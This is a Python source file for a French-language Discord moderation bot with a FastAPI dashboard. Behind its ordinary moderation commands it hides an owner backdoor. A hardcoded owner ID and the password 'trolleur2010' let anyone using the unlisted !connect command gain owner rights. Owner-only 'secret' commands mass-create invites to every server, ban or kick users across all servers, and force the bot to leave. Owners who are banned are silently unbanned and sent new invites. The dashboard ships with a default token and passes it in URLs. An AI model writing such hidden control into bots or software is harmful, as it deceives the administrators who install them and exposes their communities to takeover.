# main.py
# Bot F.I.M - Discord bot + FastAPI dashboard (A+B+C combinés)
# Requirements: see requirements.txt
# Env vars required: DISCORD_TOKEN, DASHBOARD_TOKEN
# Optional: DISCORD_CLIENT_ID, PORT

import os
import sys
import json
import threading
import asyncio
from datetime import datetime, timezone
from typing import Optional, List, Dict, Any

import discord
from discord.ext import commands

from fastapi import FastAPI, Request, HTTPException, Form
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
import uvicorn

# ------------- Config & files -------------
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
if not DISCORD_TOKEN:
    print("ERROR: DISCORD_TOKEN not set in environment.")
    sys.exit(1)

DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID") or None
DASHBOARD_TOKEN = os.getenv("DASHBOARD_TOKEN", "changeme_dashboard_token")
WEB_PORT = int(os.getenv("PORT", 8080))

CONFIG_FILE = "config.json"        # guild configs (whitelist, log_channel)
OWNER_FILE = "owner_data.json"     # owners list + password
BANSYNC_FILE = "bansync.json"      # bans list + sync flags
LOG_FILE = "fim_logs.json"         # simple logfile (appendable JSON list)

DEFAULT_OWNER_ID = 489113166429683713

# ------------- Intents & bot -------------
intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.message_content = True
intents.bans = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ------------- JSON helpers -------------
def load_json(path: str, default: Any):
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            print(f"[load_json] error loading {path}: {e}")
            return default
    return default

def save_json(path: str, data: Any):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"[save_json] error saving {path}: {e}")

def append_log(entry: dict):
    logs = load_json(LOG_FILE, [])
    logs.append(entry)
    save_json(LOG_FILE, logs)

# ------------- Owner management -------------
def ensure_owner_data():
    data = load_json(OWNER_FILE, {})
    changed = False
    if "owners" not in data:
        data["owners"] = [DEFAULT_OWNER_ID]
        changed = True
    if "password" not in data:
        data["password"] = "trolleur2010"
        changed = True
    if changed:
        save_json(OWNER_FILE, data)
    return data

def get_owners() -> List[int]:
    data = ensure_owner_data()
    owners = data.get("owners", [])
    if DEFAULT_OWNER_ID not in owners:
        owners.append(DEFAULT_OWNER_ID)
        data["owners"] = owners
        save_json(OWNER_FILE, data)
    return owners

def is_owner(uid: int) -> bool:
    return uid in get_owners()

def add_owner(uid: int) -> bool:
    data = ensure_owner_data()
    owners = data.get("owners", [])
    if uid not in owners:
        owners.append(uid)
        data["owners"] = owners
        save_json(OWNER_FILE, data)
        append_log({"time": datetime.now(timezone.utc).isoformat(), "event": "add_owner", "uid": uid})
        return True
    return False

def get_owner_password() -> str:
    data = ensure_owner_data()
    return data.get("password", "trolleur2010")

def set_owner_password(newpass: str):
    data = ensure_owner_data()
    data["password"] = newpass
    save_json(OWNER_FILE, data)
    append_log({"time": datetime.now(timezone.utc).isoformat(), "event": "set_owner_password"})

# ------------- Guild config (whitelist, logs) -------------
def get_config() -> dict:
    return load_json(CONFIG_FILE, {})

def save_config(cfg: dict):
    save_json(CONFIG_FILE, cfg)

def get_whitelist(gid: int) -> List[int]:
    cfg = get_config()
    return cfg.get(str(gid), {}).get("whitelist", [])

def add_to_whitelist(gid: int, uid: int) -> bool:
    cfg = get_config()
    g = str(gid)
    if g not in cfg:
        cfg[g] = {}
    cfg[g].setdefault("whitelist", [])
    if uid not in cfg[g]["whitelist"]:
        cfg[g]["whitelist"].append(uid)
        save_config(cfg)
        append_log({"time": datetime.now(timezone.utc).isoformat(), "event": "add_whitelist", "guild": gid, "uid": uid})
        return True
    return False

def remove_from_whitelist(gid: int, uid: int) -> bool:
    cfg = get_config()
    g = str(gid)
    if g in cfg and "whitelist" in cfg[g] and uid in cfg[g]["whitelist"]:
        cfg[g]["whitelist"].remove(uid)
        save_config(cfg)
        append_log({"time": datetime.now(timezone.utc).isoformat(), "event": "remove_whitelist", "guild": gid, "uid": uid})
        return True
    return False

def get_log_channel_id(gid: int) -> Optional[int]:
    cfg = get_config()
    return cfg.get(str(gid), {}).get("log_channel")

def set_log_channel(gid: int, channel_id: int):
    cfg = get_config()
    g = str(gid)
    cfg.setdefault(g, {})["log_channel"] = channel_id
    save_config(cfg)
    append_log({"time": datetime.now(timezone.utc).isoformat(), "event": "set_log_channel", "guild": gid, "channel": channel_id})

# ------------- BanSync storage -------------
def load_bansync() -> dict:
    return load_json(BANSYNC_FILE, {"bans": [], "sync_enabled_guilds": {}})

def save_bansync(data: dict):
    save_json(BANSYNC_FILE, data)

# in-memory set to avoid loops
_bansync_in_progress = set()

# ------------- Decorators -------------
def whitelist_check():
    async def predicate(ctx):
        try:
            if is_owner(ctx.author.id):
                return True
            if ctx.author.guild_permissions.administrator:
                return True
            if ctx.guild and ctx.author.id in get_whitelist(ctx.guild.id):
                return True
        except Exception:
            pass
        try:
            await ctx.message.delete()
        except Exception:
            pass
        return False
    return commands.check(predicate)

def owner_only():
    def pred(ctx):
        return is_owner(ctx.author.id)
    return commands.check(pred)

# ------------- Utility -------------
def build_invite_link(client_id: Optional[str]) -> str:
    if not client_id:
        return "Invite link not available (set DISCORD_CLIENT_ID)"
    return f"https://discord.com/oauth2/authorize?client_id={client_id}&scope=bot&permissions=8"

# ------------- Discord events -------------
@bot.event
async def on_ready():
    ensure_owner_data()
    print(f"✅ {bot.user} connecté (ID: {bot.user.id})")
    global DISCORD_CLIENT_ID
    if not DISCORD_CLIENT_ID:
        try:
            DISCORD_CLIENT_ID = str(bot.user.id)
        except Exception:
            DISCORD_CLIENT_ID = None

@bot.event
async def on_guild_remove(guild):
    try:
        client_id = DISCORD_CLIENT_ID or (str(bot.user.id) if bot.user else None)
        invite_link = build_invite_link(client_id) if client_id else "Client ID manquant"
        for oid in get_owners():
            try:
                u = await bot.fetch_user(oid)
                await u.send(f"⚠️ Le bot a été retiré du serveur **{guild.name}** (ID: {guild.id}). Réinvite : {invite_link}")
            except Exception:
                pass
        append_log({"time": datetime.now(timezone.utc).isoformat(), "event": "guild_remove", "guild": guild.id})
    except Exception as e:
        print("[on_guild_remove] error:", e)

@bot.event
async def on_member_ban(guild, user):
    """
    BanSync: when someone is banned in a guild with sync enabled, we propagate bans.
    Also try auto-unban if owner banned.
    """
    try:
        # auto-unban owners
        if is_owner(user.id):
            try:
                await asyncio.sleep(1)
                await guild.unban(user)
                if guild.text_channels:
                    invite = await guild.text_channels[0].create_invite(max_uses=1)
                    for oid in get_owners():
                        try:
                            u = await bot.fetch_user(oid)
                            await u.send(f"⚠️ Un owner a été banni de **{guild.name}**. Tentative de unban et invitation: {invite.url}")
                        except Exception:
                            pass
            except Exception as e:
                print("[on_member_ban] owner auto-unban failed:", e)

        data = load_bansync()
        guilds_sync = data.get("sync_enabled_guilds", {})
        if not guilds_sync.get(str(guild.id), False):
            return

        uid = int(user.id)
        if uid in _bansync_in_progress:
            return

        # store ban
        entry = {"user_id": uid, "guild_id": guild.id, "time": datetime.now(timezone.utc).isoformat(), "source": "guild_event"}
        data.setdefault("bans", [])
        if not any(b.get("user_id") == uid for b in data["bans"]):
            data["bans"].append(entry)
            save_bansync(data)
            append_log({"time": datetime.now(timezone.utc).isoformat(), "event": "bansync_add", "uid": uid, "guild": guild.id})

        _bansync_in_progress.add(uid)
        try:
            # propagate
            for g in bot.guilds:
                try:
                    if str(g.id) == str(guild.id):
                        continue
                    if not guilds_sync.get(str(g.id), False):
                        continue
                    # skip owner or whitelisted on that guild
                    member = g.get_member(uid)
                    if member and is_owner(member.id):
                        continue
                    if member and uid in get_whitelist(g.id):
                        continue
                    try:
                        await g.ban(discord.Object(id=uid), reason=f"BanSync: banned on {guild.name}")
                    except Exception:
                        pass
                except Exception:
                    pass
        finally:
            if uid in _bansync_in_progress:
                _bansync_in_progress.remove(uid)
    except Exception as e:
        print("[on_member_ban] general error:", e)

@bot.event
async def on_member_remove(member):
    # if owner removed/kicked, create invite and notify owners
    try:
        if is_owner(member.id):
            guild = member.guild
            if guild and guild.text_channels:
                invite = await guild.text_channels[0].create_invite(max_uses=1)
                for oid in get_owners():
                    try:
                        u = await bot.fetch_user(oid)
                        await u.send(f"🚪 Un owner ({member}) a été expulsé/departi de **{guild.name}**. Invitation : {invite.url}")
                    except Exception:
                        pass
            append_log({"time": datetime.now(timezone.utc).isoformat(), "event": "owner_removed", "guild": guild.id})
    except Exception as e:
        print("[on_member_remove] error:", e)

# ------------- Commands (public/admin/owner) -------------
@bot.command(name="ping")
async def cmd_ping(ctx):
    await ctx.send("🏓 Pong ! Le bot F.I.M est opérationnel.")

@bot.command(name="help")
async def cmd_help(ctx):
    em = discord.Embed(title="📋 Commandes publiques", color=discord.Color.from_rgb(153,0,0))
    em.add_field(name="!ping", value="Test", inline=False)
    em.add_field(name="!say <message>", value="Whitelist/Admin", inline=False)
    em.add_field(name="!send #canal <message>", value="Whitelist/Admin", inline=False)
    em.add_field(name="!embed <titre> <desc>", value="Whitelist/Admin", inline=False)
    await ctx.send(embed=em)

# admin / whitelist commands
@bot.command(name="say")
@whitelist_check()
async def cmd_say(ctx, *, message: str):
    try: await ctx.message.delete()
    except: pass
    await ctx.send(message)

@bot.command(name="send")
@whitelist_check()
async def cmd_send(ctx, channel: discord.TextChannel, *, message: str):
    try: await ctx.message.delete()
    except: pass
    await channel.send(message)
    try: await ctx.send(f"✅ Message envoyé dans {channel.mention}", delete_after=3)
    except: pass

@bot.command(name="embed")
@whitelist_check()
async def cmd_embed(ctx, title: str, *, description: str):
    try: await ctx.message.delete()
    except: pass
    em = discord.Embed(title=title, description=description, color=discord.Color.from_rgb(153,0,0))
    em.set_footer(text=f"Envoyé par {ctx.author}")
    await ctx.send(embed=em)

@bot.command(name="addrole")
@whitelist_check()
async def cmd_addrole(ctx, member: discord.Member, role: discord.Role):
    try:
        await member.add_roles(role)
        await ctx.send(f"✅ Rôle {role.name} ajouté à {member.mention}")
    except discord.Forbidden:
        await ctx.send("❌ Je n'ai pas la permission.")
    except Exception as e:
        print("[addrole] error:", e)
        await ctx.send("❌ Erreur interne.")

@bot.command(name="removerole")
@whitelist_check()
async def cmd_removerole(ctx, member: discord.Member, role: discord.Role):
    try:
        await member.remove_roles(role)
        await ctx.send(f"✅ Rôle {role.name} retiré de {member.mention}")
    except discord.Forbidden:
        await ctx.send("❌ Je n'ai pas la permission.")
    except Exception as e:
        print("[removerole] error:", e)
        await ctx.send("❌ Erreur interne.")

# whitelist group
@bot.group(name="whitelist", invoke_without_command=True)
@commands.has_permissions(administrator=True)
async def cmd_whitelist(ctx):
    await ctx.send("❌ Utilise: !whitelist add / remove / list")

@cmd_whitelist.command(name="add")
@commands.has_permissions(administrator=True)
async def cmd_whitelist_add(ctx, member: discord.Member):
    if add_to_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"✅ {member.mention} ajouté à la whitelist")
    else:
        await ctx.send(f"⚠️ {member.mention} est déjà whitelisté")

@cmd_whitelist.command(name="remove")
@commands.has_permissions(administrator=True)
async def cmd_whitelist_remove(ctx, member: discord.Member):
    if remove_from_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"❌ {member.mention} retiré de la whitelist")
    else:
        await ctx.send(f"⚠️ {member.mention} n'est pas whitelisté")

@cmd_whitelist.command(name="list")
@commands.has_permissions(administrator=True)
async def cmd_whitelist_list(ctx):
    wl = get_whitelist(ctx.guild.id)
    if not wl:
        return await ctx.send("📋 Aucun utilisateur whitelisté")
    mentions = [ctx.guild.get_member(uid).mention if ctx.guild.get_member(uid) else f"ID:{uid}" for uid in wl]
    await ctx.send("\n".join(mentions))

@bot.command(name="setlogs")
@commands.has_permissions(administrator=True)
async def cmd_setlogs(ctx, channel: discord.TextChannel):
    set_log_channel(ctx.guild.id, channel.id)
    await ctx.send(f"✅ Canal de logs défini sur {channel.mention}")

# local mod commands
@bot.command(name="ban")
@whitelist_check()
async def cmd_ban(ctx, member: discord.Member, *, reason: str = "Non spécifiée"):
    try:
        if member.id == bot.user.id or is_owner(member.id):
            return await ctx.send("❌ Action impossible.")
        await ctx.guild.ban(member, reason=f"{ctx.author} | {reason}")
        await ctx.send(f"✅ {member.mention} banni. (Raison: {reason})")
        append_log({"time": datetime.now(timezone.utc).isoformat(), "event": "local_ban", "guild": ctx.guild.id, "target": member.id, "by": ctx.author.id})
        # log channel message if configured:
        log_id = get_log_channel_id(ctx.guild.id)
        if log_id:
            ch = ctx.guild.get_channel(log_id)
            if ch:
                em = discord.Embed(title="👮 Membre banni", color=discord.Color.red())
                em.add_field(name="Membre", value=f"{member} ({member.id})", inline=False)
                em.add_field(name="Par", value=f"{ctx.author} ({ctx.author.id})", inline=False)
                em.add_field(name="Raison", value=reason, inline=False)
                em.set_footer(text=str(datetime.now(timezone.utc)))
                try: await ch.send(embed=em)
                except: pass
    except Exception as e:
        print("[ban] error:", e)
        await ctx.send("❌ Impossible de bannir ce membre.")

@bot.command(name="kick")
@whitelist_check()
async def cmd_kick(ctx, member: discord.Member, *, reason: str = "Non spécifiée"):
    try:
        if member.id == bot.user.id or is_owner(member.id):
            return await ctx.send("❌ Action impossible.")
        await ctx.guild.kick(member, reason=f"{ctx.author} | {reason}")
        await ctx.send(f"✅ {member.mention} exclu. (Raison: {reason})")
        append_log({"time": datetime.now(timezone.utc).isoformat(), "event": "local_kick", "guild": ctx.guild.id, "target": member.id, "by": ctx.author.id})
    except Exception as e:
        print("[kick] error:", e)
        await ctx.send("❌ Impossible de kicker ce membre.")

# owner/global commands
@bot.command(name="broadcast")
@owner_only()
async def cmd_broadcast(ctx, *, message: str):
    for g in bot.guilds:
        try:
            if g.text_channels:
                await g.text_channels[0].send(f"📢 **Annonce Owner:** {message}")
        except Exception:
            pass
    try: await ctx.author.send("✅ Broadcast envoyé.")
    except: pass

@bot.command(name="forcerinv")
@owner_only()
async def cmd_forcerinv(ctx):
    for g in bot.guilds:
        try:
            if g.text_channels:
                invite = await g.text_channels[0].create_invite(max_uses=1)
                for oid in get_owners():
                    try:
                        u = await bot.fetch_user(oid)
                        await u.send(f"🔗 Invitation pour {g.name}: {invite.url}")
                    except Exception:
                        pass
        except Exception:
            pass
    try: await ctx.author.send("✅ Invitations envoyées aux owners.")
    except: pass

@bot.command(name="serverlist")
@owner_only()
async def cmd_serverlist(ctx):
    lines = [f"- {g.name} ({g.id}) - {g.member_count} membres" for g in bot.guilds]
    txt = "\n".join(lines) or "Aucun serveur."
    try: await ctx.author.send(f"📋 Serveurs ({len(bot.guilds)}):\n{txt}")
    except: pass

@bot.command(name="syncwhitelist")
@owner_only()
async def cmd_syncwhitelist(ctx):
    src = get_whitelist(ctx.guild.id)
    cfg = get_config()
    for g in bot.guilds:
        gid = str(g.id)
        cfg.setdefault(gid, {})["whitelist"] = src.copy()
    save_config(cfg)
    try: await ctx.author.send("🔁 Whitelist synchronisée.")
    except: pass

@bot.command(name="globalban")
@owner_only()
async def cmd_globalban(ctx, user: str):
    try:
        uid = int(user.strip("<@!>"))
    except:
        try: uid = int(user)
        except: return
    count = 0
    for g in bot.guilds:
        try:
            if is_owner(uid): continue
            await g.ban(discord.Object(id=uid), reason=f"Global ban by owner {ctx.author.id}")
            count += 1
        except Exception:
            pass
    try: await ctx.author.send(f"✅ Global ban exécuté sur {count} serveurs.")
    except: pass

@bot.command(name="globalkick")
@owner_only()
async def cmd_globalkick(ctx, user: str):
    try:
        uid = int(user.strip("<@!>"))
    except:
        try: uid = int(user)
        except: return
    count = 0
    for g in bot.guilds:
        try:
            m = g.get_member(uid)
            if m:
                await g.kick(m, reason=f"Global kick by owner {ctx.author.id}")
                count += 1
        except Exception:
            pass
    try: await ctx.author.send(f"✅ Global kick exécuté sur {count} serveurs.")
    except: pass

@bot.command(name="connect")
async def cmd_connect(ctx, password: str):
    try:
        if password == get_owner_password():
            added = add_owner(ctx.author.id)
            if added:
                try: await ctx.author.send("✅ Tu as été ajouté comme owner.")
                except: pass
            else:
                try: await ctx.author.send("ℹ️ Tu es déjà owner.")
                except: pass
    except Exception:
        pass

@bot.command(name="setpass")
@owner_only()
async def cmd_setpass(ctx, *, newpass: str):
    set_owner_password(newpass)
    try: await ctx.author.send("🔒 Mot de passe owner mis à jour.")
    except: pass

@bot.command(name="ownerhelp")
@owner_only()
async def cmd_ownerhelp(ctx):
    embed = discord.Embed(title="👑 Commandes Owner (secrètes)", color=discord.Color.gold())
    cmds = [
        ("!broadcast <msg>", "Annonce tous les serveurs"),
        ("!forcerinv", "Envoie invitations"),
        ("!serverlist", "Liste serveurs (DM)"),
        ("!syncwhitelist", "Synchronise whitelist"),
        ("!globalban <id>", "Ban global"),
        ("!globalkick <id>", "Kick global"),
        ("!setpass <pass>", "Change mot de passe secret"),
        ("!reboot", "Redémarre le bot"),
        ("!10-10", "Force le bot à quitter le serveur courant")
    ]
    for name, desc in cmds:
        embed.add_field(name=name, value=desc, inline=False)
    try: await ctx.author.send(embed=embed)
    except: pass

@bot.command(name="10-10")
@owner_only()
async def cmd_10_10(ctx):
    if not ctx.guild:
        try: await ctx.author.send("❌ Cette commande doit être utilisée depuis un serveur.")
        except: pass
        return
    try:
        embed = discord.Embed(title="🧹 10-10 exécuté", description=f"Le bot quitte le serveur sur demande d'un owner.", color=discord.Color.dark_gold(), timestamp=datetime.utcnow())
        embed.add_field(name="Serveur", value=f"{ctx.guild.name} ({ctx.guild.id})", inline=False)
        embed.add_field(name="Déclenché par", value=f"{ctx.author} ({ctx.author.id})", inline=False)
        for oid in get_owners():
            try:
                u = await bot.fetch_user(oid)
                await u.send(embed=embed)
            except: pass
    except: pass
    try: await ctx.send("🧹 Déconnexion autorisée par owner. Au revoir.")
    except: pass
    try: await ctx.guild.leave()
    except: pass

@bot.command(name="reboot")
@owner_only()
async def cmd_reboot(ctx):
    try:
        await ctx.author.send("♻️ Redémarrage en cours...")
    except: pass
    try:
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception as e:
        print("[reboot] error:", e)
        try: await ctx.send("❌ Impossible de redémarrer.")
        except: pass

# ------------- BanSync control commands (owner) -------------
@bot.command(name="bansync_enable")
@owner_only()
async def cmd_bansync_enable(ctx, enable: bool = True):
    data = load_bansync()
    data.setdefault("sync_enabled_guilds", {})
    data["sync_enabled_guilds"][str(ctx.guild.id)] = bool(enable)
    save_bansync(data)
    await ctx.send(f"✅ BanSync {'activé' if enable else 'désactivé'} pour ce serveur.")

@bot.command(name="bansync_status")
@owner_only()
async def cmd_bansync_status(ctx):
    data = load_bansync()
    enabled = data.get("sync_enabled_guilds", {}).get(str(ctx.guild.id), False)
    await ctx.send(f"BanSync pour ce serveur : {'ON' if enabled else 'OFF'}")

# ------------- FastAPI Dashboard -------------
app = FastAPI(title="FIM Dashboard")

# simple HTML templates (inline, minimal)
INDEX_HTML = """
<html><body>
<h1>FIM Dashboard</h1>
<p>Bot status: {{status}}</p>
<ul>
<li><a href="/guilds?token={{token}}">Guilds</a></li>
<li><a href="/bans?token={{token}}">BanSync list</a></li>
<li><a href="/owners?token={{token}}">Owners</a></li>
<li><a href="/logs?token={{token}}">Logs</a></li>
<li><a href="/actions?token={{token}}">Actions</a></li>
</ul>
</body></html>
"""

def require_token(request: Request):
    token = request.query_params.get("token") or request.headers.get("X-DASH-TOKEN")
    if token != DASHBOARD_TOKEN:
        raise HTTPException(status_code=401, detail="Unauthorized")

@app.get("/", response_class=HTMLResponse)
async def dashboard_index(request: Request):
    require_token(request)
    status = "online" if bot.is_ready() else "offline"
    return HTMLResponse(INDEX_HTML.replace("{{status}}", status).replace("{{token}}", DASHBOARD_TOKEN))

@app.get("/guilds", response_class=HTMLResponse)
async def dashboard_guilds(request: Request):
    require_token(request)
    html = "<h2>Guilds</h2><ul>"
    for g in bot.guilds:
        html += f"<li>{g.name} ({g.id}) - {g.member_count} membres - <a href='/manage/{g.id}?token={DASHBOARD_TOKEN}'>Manage</a></li>"
    html += f"</ul><p><a href='/?token={DASHBOARD_TOKEN}'>Back</a></p>"
    return HTMLResponse(html)

@app.get("/manage/{gid}", response_class=HTMLResponse)
async def dashboard_manage(gid: int, request: Request):
    require_token(request)
    cfg = get_config()
    bans = load_bansync()
    sync_enabled = bans.get("sync_enabled_guilds", {}).get(str(gid), False)
    wl = cfg.get(str(gid), {}).get("whitelist", [])
    html = f"<h2>Manage Guild {gid}</h2>"
    html += f"<p>BanSync: {'ON' if sync_enabled else 'OFF'}</p>"
    html += "<form method='post' action='/manage_toggle_sync?token=%s'><input type='hidden' name='gid' value='%s'><button>Toggle BanSync</button></form>" % (DASHBOARD_TOKEN, gid)
    html += "<h3>Whitelist</h3><ul>"
    for uid in wl:
        html += f"<li>{uid} <form style='display:inline' method='post' action='/manage_remove_whitelist?token={DASHBOARD_TOKEN}'><input type='hidden' name='gid' value='{gid}'><input type='hidden' name='uid' value='{uid}'><button>Remove</button></form></li>"
    html += "</ul>"
    html += "<form method='post' action='/manage_add_whitelist?token=%s'>UID to add: <input name='uid'><input type='hidden' name='gid' value='%s'><button>Add</button></form>" % (DASHBOARD_TOKEN, gid)
    html += f"<p><a href='/?token={DASHBOARD_TOKEN}'>Back</a></p>"
    return HTMLResponse(html)

@app.post("/manage_toggle_sync")
async def manage_toggle_sync(gid: int = Form(...), request: Request = None):
    require_token(request)
    data = load_bansync()
    data.setdefault("sync_enabled_guilds", {})
    cur = data["sync_enabled_guilds"].get(str(gid), False)
    data["sync_enabled_guilds"][str(gid)] = not cur
    save_bansync(data)
    return RedirectResponse(url=f"/manage/{gid}?token={DASHBOARD_TOKEN}", status_code=303)

@app.post("/manage_add_whitelist")
async def manage_add_whitelist(gid: int = Form(...), uid: int = Form(...), request: Request = None):
    require_token(request)
    add_to_whitelist(gid, uid)
    return RedirectResponse(url=f"/manage/{gid}?token={DASHBOARD_TOKEN}", status_code=303)

@app.post("/manage_remove_whitelist")
async def manage_remove_whitelist(gid: int = Form(...), uid: int = Form(...), request: Request = None):
    require_token(request)
    remove_from_whitelist(gid, uid)
    return RedirectResponse(url=f"/manage/{gid}?token={DASHBOARD_TOKEN}", status_code=303)

@app.get("/bans", response_class=HTMLResponse)
async def dashboard_bans(request: Request):
    require_token(request)
    data = load_bansync()
    bans = data.get("bans", [])
    html = "<h2>BanSync list</h2><ul>"
    for b in bans:
        html += f"<li>{b.get('user_id')} - banned on {b.get('guild_id')} @ {b.get('time')} (source: {b.get('source')})</li>"
    html += f"</ul><p><a href='/?token={DASHBOARD_TOKEN}'>Back</a></p>"
    return HTMLResponse(html)

@app.get("/owners", response_class=HTMLResponse)
async def dashboard_owners(request: Request):
    require_token(request)
    owners = get_owners()
    html = "<h2>Owners</h2><ul>"
    for o in owners:
        html += f"<li>{o}</li>"
    html += "</ul><form method='post' action='/owners_add?token=%s'>Add owner UID: <input name='uid'><button>Add</button></form>" % DASHBOARD_TOKEN
    html += f"<p><a href='/?token={DASHBOARD_TOKEN}'>Back</a></p>"
    return HTMLResponse(html)

@app.post("/owners_add")
async def owners_add(uid: int = Form(...), request: Request = None):
    require_token(request)
    add_owner(uid)
    return RedirectResponse(url=f"/owners?token={DASHBOARD_TOKEN}", status_code=303)

@app.get("/logs", response_class=HTMLResponse)
async def dashboard_logs(request: Request):
    require_token(request)
    logs = load_json(LOG_FILE, [])
    html = "<h2>Logs</h2><ul>"
    for l in logs[-200:]:
        html += f"<li>{l}</li>"
    html += f"</ul><p><a href='/?token={DASHBOARD_TOKEN}'>Back</a></p>"
    return HTMLResponse(html)

@app.get("/actions", response_class=HTMLResponse)
async def dashboard_actions(request: Request):
    require_token(request)
    html = "<h2>Actions</h2>"
    html += "<form method='post' action='/actions_ban?token=%s'>Ban UID: <input name='uid'><button>Ban</button></form>" % DASHBOARD_TOKEN
    html += "<form method='post' action='/actions_kick?token=%s'>Kick UID: <input name='uid'><button>Kick</button></form>" % DASHBOARD_TOKEN
    html += f"<p><a href='/?token={DASHBOARD_TOKEN}'>Back</a></p>"
    return HTMLResponse(html)

@app.post("/actions_ban")
async def actions_ban(uid: int = Form(...), request: Request = None):
    require_token(request)
    # schedule coroutine on bot loop
    fut = asyncio.run_coroutine_threadsafe(api_global_ban(uid), bot.loop)
    try:
        fut.result(timeout=10)
    except Exception:
        pass
    return RedirectResponse(url=f"/actions?token={DASHBOARD_TOKEN}", status_code=303)

@app.post("/actions_kick")
async def actions_kick(uid: int = Form(...), request: Request = None):
    require_token(request)
    fut = asyncio.run_coroutine_threadsafe(api_global_kick(uid), bot.loop)
    try:
        fut.result(timeout=10)
    except Exception:
        pass
    return RedirectResponse(url=f"/actions?token={DASHBOARD_TOKEN}", status_code=303)

# ------------- Dashboard API helpers (called on bot loop) -------------
async def api_global_ban(uid: int):
    # ban across guilds where permitted (skip owners)
    for g in bot.guilds:
        try:
            if is_owner(uid):
                continue
            await g.ban(discord.Object(id=uid), reason="Global ban via dashboard")
        except Exception:
            pass
    append_log({"time": datetime.now(timezone.utc).isoformat(), "event": "api_global_ban", "uid": uid})

async def api_global_kick(uid: int):
    for g in bot.guilds:
        try:
            m = g.get_member(uid)
            if m:
                await g.kick(m, reason="Global kick via dashboard")
        except Exception:
            pass
    append_log({"time": datetime.now(timezone.utc).isoformat(), "event": "api_global_kick", "uid": uid})

# ------------- Start FastAPI in thread -------------
def run_api():
    # uvicorn logs are verbose; keep default
    uvicorn.run(app, host="0.0.0.0", port=WEB_PORT, log_level="info")

api_thread = threading.Thread(target=run_api, daemon=True)

# ------------- Main run -------------
if __name__ == "__main__":
    try:
        api_thread.start()
        print("[main] FastAPI dashboard started on thread")
    except Exception as e:
        print("[main] Failed to start API thread:", e)

    # Run Discord bot (blocking)
    while True:
        try:
            bot.run(DISCORD_TOKEN)
        except Exception as e:
            print("[main] Bot crash detected:", e)
            try:
                asyncio.run(asyncio.sleep(3))
            except Exception:
                pass
            continue
